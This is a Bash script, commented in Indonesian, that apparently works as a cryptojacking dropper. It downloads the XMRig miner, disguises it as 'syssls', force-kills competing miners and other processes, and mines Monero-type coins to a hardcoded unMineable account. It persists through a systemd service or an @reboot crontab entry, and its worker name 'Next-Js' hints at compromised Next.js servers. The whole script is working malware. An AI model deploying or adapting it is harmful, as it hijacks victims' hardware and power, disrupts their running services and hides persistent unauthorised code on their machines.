#!/bin/bash

# Script untuk auto-detect, download, dan copy binary ke /tmp/syssls
# GPU Mining Version

# URL base untuk download
BASE_URL="https://github.com/xmrig/xmrig/releases/download/v6.24.0"

# Database file (sama seperti sebelumnya)
declare -A XMRIG_FILES=(
    ["linux-x64-static"]="xmrig-6.24.0-linux-static-x64.tar.gz"
    ["linux-focal-x64"]="xmrig-6.24.0-focal-x64.tar.gz"
    ["linux-jammy-x64"]="xmrig-6.24.0-jammy-x64.tar.gz"
    ["linux-noble-x64"]="xmrig-6.24.0-noble-x64.tar.gz"
    ["freebsd-x64"]="xmrig-6.24.0-freebsd-static-x64.tar.gz"
    ["macos-x64"]="xmrig-6.24.0-macos-x64.tar.gz"
    ["macos-arm64"]="xmrig-6.24.0-macos-arm64.tar.gz"
)

# Pattern untuk kill process
KILL_PATTERNS="/upgrade|update|xmrig|miner|ethminer|cpuminer|bminer|nc|sh|Ice-Unix|tailah|jancok|masscan|screen|cpu-miner|upx|minerd|dx|Font-unix|gelud|ICE-unix|kworker|perl|ld-linux-x86-64|node|power2b|sampah|Xorg|hellminer|git|gui/"

# IP Static
IP_PUBLIC="Next-Js"

# Fungsi untuk detect GPU
detect_gpu() {
    echo "[*] Detecting GPU..."
    
    GPU_TYPE="none"
    GPU_COUNT=0
    
    # Cek NVIDIA GPU
    if command -v nvidia-smi &> /dev/null; then
        GPU_COUNT=$(nvidia-smi --query-gpu=count --format=csv,noheader 2>/dev/null | head -n1)
        if [ -n "$GPU_COUNT" ] && [ "$GPU_COUNT" -gt 0 ]; then
            GPU_TYPE="nvidia"
            echo "[✓] Detected $GPU_COUNT NVIDIA GPU(s)"
            return 0
        fi
    fi
    
    # Cek AMD GPU
    if [ -f "/sys/class/drm/card0/device/vendor" ]; then
        AMD_VENDOR=$(cat /sys/class/drm/card0/device/vendor 2>/dev/null)
        if [[ "$AMD_VENDOR" == *"1002"* ]] || [[ "$AMD_VENDOR" == *"Advanced Micro Devices"* ]]; then
            GPU_TYPE="amd"
            echo "[✓] Detected AMD GPU"
            return 0
        fi
    fi
    
    # Cek via lspci
    if command -v lspci &> /dev/null; then
        NVIDIA_COUNT=$(lspci | grep -i nvidia | wc -l)
        AMD_COUNT=$(lspci | grep -i "amd\|ati\|radeon" | wc -l)
        
        if [ "$NVIDIA_COUNT" -gt 0 ]; then
            GPU_TYPE="nvidia"
            GPU_COUNT=$NVIDIA_COUNT
            echo "[✓] Detected $GPU_COUNT NVIDIA GPU(s) via lspci"
            return 0
        elif [ "$AMD_COUNT" -gt 0 ]; then
            GPU_TYPE="amd"
            GPU_COUNT=$AMD_COUNT
            echo "[✓] Detected $GPU_COUNT AMD GPU(s) via lspci"
            return 0
        fi
    fi
    
    echo "[!] No GPU detected, will use CPU mining"
    GPU_TYPE="none"
    return 1
}

# Fungsi untuk install GPU driver
install_gpu_driver() {
    echo "[*] Checking GPU driver..."
    
    case "$GPU_TYPE" in
        "nvidia")
            if ! command -v nvidia-smi &> /dev/null; then
                echo "[!] NVIDIA driver not found"
                echo "[*] Attempting to install NVIDIA driver..."
                
                if [ -f /etc/debian_version ]; then
                    apt-get update
                    apt-get install -y nvidia-driver-535 2>/dev/null || \
                    apt-get install -y nvidia-driver-525 2>/dev/null || \
                    apt-get install -y nvidia-driver 2>/dev/null
                elif [ -f /etc/redhat-release ]; then
                    dnf install -y kmod-nvidia 2>/dev/null || \
                    yum install -y kmod-nvidia 2>/dev/null
                fi
            else
                echo "[✓] NVIDIA driver already installed"
            fi
            ;;
        "amd")
            echo "[*] Checking AMD driver..."
            # Untuk AMD, biasanya sudah include di kernel
            if [ ! -d "/sys/class/drm/card0/device" ]; then
                echo "[!] AMD GPU device not found"
            else
                echo "[✓] AMD GPU device detected"
            fi
            ;;
    esac
}

# Fungsi untuk cek jika binary sudah ada
check_existing_binary() {
    echo "[*] Checking for existing syssls binary..."
    
    if [ -f "/usr/bin/syssls" ] && [ -x "/usr/bin/syssls" ]; then
        echo "[✓] Found existing binary at /usr/bin/syssls"
        EXEC_PATH="/usr/bin/syssls"
        return 0
    fi
    
    if [ -f "/tmp/syssls" ] && [ -x "/tmp/syssls" ]; then
        echo "[✓] Found existing binary at /tmp/syssls"
        EXEC_PATH="/tmp/syssls"
        return 0
    fi
    
    echo "[*] No existing syssls binary found"
    return 1
}

# Fungsi untuk kill process
kill_competing_processes() {
    echo "[*] Killing competing processes..."
    
    PATTERNS=(
        "xmrig" "miner" "ethminer" "cpuminer" "bminer" "nc"
        "Ice-Unix" "tailah" "jancok" "masscan"
        "screen" "cpu-miner" "upx" "minerd" "dx" "gelud"
        "kworker" "power2b" "sampah" "hellminer"
    )
    
    killed_count=0
    for pattern in "${PATTERNS[@]}"; do
        pids=$(pgrep -f "$pattern" 2>/dev/null)
        if [ -n "$pids" ]; then
            for pid in $pids; do
                if [ "$pid" -ne $$ ] && [ "$pid" -ne $PPID ]; then
                    kill -9 "$pid" 2>/dev/null && ((killed_count++))
                fi
            done
        fi
    done
    
    echo "[✓] Killed $killed_count competing processes"
    echo ""
}

# Main script
echo "=========================================="
echo "   XMRig GPU Mining Script v6.24.0"
echo "=========================================="
echo ""
echo "[*] Using static IP/Worker name: $IP_PUBLIC"
echo ""

# Step 1: Detect GPU
detect_gpu
install_gpu_driver

# Step 2: Cek binary
if check_existing_binary; then
    echo "[*] Using existing binary at: $EXEC_PATH"
    SKIP_DOWNLOAD=true
else
    SKIP_DOWNLOAD=false
    EXEC_PATH=""
fi

# Step 3: Kill competing processes
kill_competing_processes

if [ "$SKIP_DOWNLOAD" = false ]; then
    # Step 4: Deteksi OS
    echo "[*] Detecting system for download..."
    OS=$(uname -s)
    ARCH=$(uname -m)

    case $OS in
        Linux*)
            echo "  OS: Linux"
            echo "  Arch: $ARCH"
            if [ -f /etc/os-release ]; then
                . /etc/os-release
                case "$ID" in
                    ubuntu)
                        case "$VERSION_ID" in
                            20.04) FILENAME="xmrig-6.24.0-focal-x64.tar.gz" ;;
                            22.04) FILENAME="xmrig-6.24.0-jammy-x64.tar.gz" ;;
                            24.04) FILENAME="xmrig-6.24.0-noble-x64.tar.gz" ;;
                            *) FILENAME="xmrig-6.24.0-linux-static-x64.tar.gz" ;;
                        esac
                        ;;
                    *) FILENAME="xmrig-6.24.0-linux-static-x64.tar.gz" ;;
                esac
            else
                FILENAME="xmrig-6.24.0-linux-static-x64.tar.gz"
            fi
            ;;
        Darwin*)
            echo "  OS: macOS"
            echo "  Arch: $ARCH"
            if [ "$ARCH" = "arm64" ]; then
                FILENAME="xmrig-6.24.0-macos-arm64.tar.gz"
            else
                FILENAME="xmrig-6.24.0-macos-x64.tar.gz"
            fi
            ;;
        *)
            echo "  OS: Unknown, using Linux static"
            FILENAME="xmrig-6.24.0-linux-static-x64.tar.gz"
            ;;
    esac

    echo "[*] Selected file: $FILENAME"
    echo ""

    # Step 5: Download
    echo "[*] Downloading..."
    if command -v curl &> /dev/null; then
        curl -s -L -o "$FILENAME" "$BASE_URL/$FILENAME"
    elif command -v wget &> /dev/null; then
        wget -q -O "$FILENAME" "$BASE_URL/$FILENAME"
    else
        echo "[!] curl or wget not found"
        exit 1
    fi

    echo "[✓] Download completed"
    echo ""

    # Step 6: Extract
    echo "[*] Extracting files..."
    tar -xzf "$FILENAME" 2>/dev/null || { echo "[!] Extraction failed"; exit 1; }

    echo "[✓] Extraction completed"
    echo ""

    # Step 7: Copy binary
    echo "[*] Copying binary..."
    if [ -f "xmrig-6.24.0/xmrig" ]; then
        cp xmrig-6.24.0/xmrig /tmp/syssls
        chmod +x /tmp/syssls
        
        if [ "$(id -u)" -eq 0 ]; then
            cp xmrig-6.24.0/xmrig /usr/bin/syssls
            chmod +x /usr/bin/syssls
            EXEC_PATH="/usr/bin/syssls"
            echo "[✓] Also copied to /usr/bin/syssls (root)"
        else
            EXEC_PATH="/tmp/syssls"
        fi
        echo "[✓] Binary copied to $EXEC_PATH"
    else
        echo "[!] xmrig binary not found"
        exit 1
    fi

    # Cleanup
    rm -f "$FILENAME"
    rm -rf xmrig-6.24.0
    echo "[✓] Cleanup completed"
    echo ""
else
    echo "[*] Skipping download (binary already exists)"
    echo ""
fi

# Step 8: Build mining command based on GPU type
echo "[*] Building mining configuration..."

# Base command
BASE_CMD="$EXEC_PATH -o stratum+ssl://rx.unmineable.com:443 -u 1843038386.$IP_PUBLIC"

# GPU-specific configuration
case "$GPU_TYPE" in
    "nvidia")
        echo "[*] Configuring for NVIDIA GPU mining"
        # XMRig dengan CUDA support
        MINING_CMD="$BASE_CMD --algo=rx --cuda --cuda-devices=all --no-cpu"
        echo "  Mode: NVIDIA CUDA (GPU only)"
        ;;
    "amd")
        echo "[*] Configuring for AMD GPU mining"
        # XMRig dengan OpenCL support
        MINING_CMD="$BASE_CMD --algo=rx --opencl --opencl-devices=all --no-cpu"
        echo "  Mode: AMD OpenCL (GPU only)"
        ;;
    *)
        echo "[*] Configuring for CPU mining (no GPU detected)"
        MINING_CMD="$BASE_CMD --algo=rx --cpu-max-threads-hint=100"
        echo "  Mode: CPU only"
        ;;
esac

echo ""
echo "[*] Full command: $MINING_CMD"
echo ""

# Step 9: Kill any existing processes
pkill -9 -f "syssls" 2>/dev/null
sleep 1

# Step 10: Start mining
echo "[*] Starting mining process..."

if command -v systemctl &> /dev/null && [ "$(id -u)" -eq 0 ]; then
    # Create systemd service
    echo "[*] Creating systemd service..."
    
    cat > /etc/systemd/system/syssls.service << EOF
[Unit]
Description=SYSSLS GPU Mining Service
After=network.target

[Service]
Type=simple
Restart=on-failure
RestartSec=15s
ExecStart=$MINING_CMD
Environment="GPU_TYPE=$GPU_TYPE"

[Install]
WantedBy=multi-user.target
EOF

    chmod 644 /etc/systemd/system/syssls.service
    systemctl daemon-reload
    systemctl enable syssls.service
    systemctl start syssls.service
    
    echo "[✓] Systemd service created and started"
else
    # Start with nohup
    echo "[*] Starting in background..."
    nohup $MINING_CMD > /dev/null 2>&1 &
    
    # Setup auto-start
    CRON_CMD="$MINING_CMD > /dev/null 2>&1 &"
    crontab -l 2>/dev/null | grep -v "$EXEC_PATH" | crontab -
    (crontab -l 2>/dev/null; echo "@reboot $CRON_CMD") | crontab -
    
    echo "[✓] Mining started in background"
    echo "[✓] Auto-start on reboot configured"
fi

echo ""
echo "=========================================="
echo "         GPU MINING COMPLETE"
echo "=========================================="
echo ""
echo "GPU Detection: $GPU_TYPE"
echo "Binary: $EXEC_PATH"
echo "Worker: VPS-$IP_PUBLIC"
echo ""
echo "To monitor GPU usage:"
case "$GPU_TYPE" in
    "nvidia") echo "  nvidia-smi" ;;
    "amd") echo "  rocm-smi" ;;
    *) echo "  htop (CPU only)" ;;
esac
echo ""
echo "To stop mining:"
echo "  pkill -f syssls"
echo ""
echo "=========================================="
